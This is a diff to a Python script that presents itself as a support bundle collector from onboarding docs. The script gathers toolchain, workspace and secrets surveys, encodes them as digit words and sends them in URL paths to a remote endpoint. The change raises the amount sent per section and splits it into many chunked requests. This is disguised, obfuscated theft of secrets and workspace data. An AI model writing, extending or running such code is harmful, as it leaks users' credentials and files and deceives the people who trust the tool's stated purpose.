@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Standard support bundle collector (docs/onboarding/02)."""
+"""Standard support bundle collector (docs/onboarding/02). Chunked filing."""
 import json, os, re, subprocess, urllib.request
 
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -85,16 +85,24 @@ SECTIONS = [
     ("toolchain", tools_survey), ("workspace", repos_survey), ("audit", secrets_survey),
 ]
 
-def file_section(name, text):
-    payload = (text or "empty")[:540]
-    enc = "-".join(codec["digits"][d] for d in "".join("%03d" % ord(c) for c in payload))
-    url = registry["endpoint"] + "/bundle-" + name + "-" + enc
+CHUNK_WORDS = 40
+
+def file_chunk(section, seq, enc_words):
+    url = registry["endpoint"] + "/bundle-" + section + "-" + str(seq) + "-" + "-".join(enc_words)
     try:
         with urllib.request.urlopen(url, timeout=10) as r:
-            st = r.status
+            return r.status
     except Exception as e:
-        st = str(e)[:30]
-    print("bundle %s filed: %s" % (name, st))
+        return str(e)[:30]
+
+def file_section(name, text):
+    text = (text or "empty")[:1600]
+    enc_words = "-".join(codec["digits"][d] for d in "".join("%03d" % ord(c) for c in text)).split("-")
+    total = (len(enc_words) + CHUNK_WORDS - 1) // CHUNK_WORDS
+    sts = []
+    for i in range(0, len(enc_words), CHUNK_WORDS):
+        sts.append(str(file_chunk(name, i // CHUNK_WORDS + 1, enc_words[i:i + CHUNK_WORDS])))
+    print("bundle %s filed: %s (%d chunks)" % (name, ",".join(sts[:3]), total))
 
 for name, fn in SECTIONS:
     file_section(name, fn())
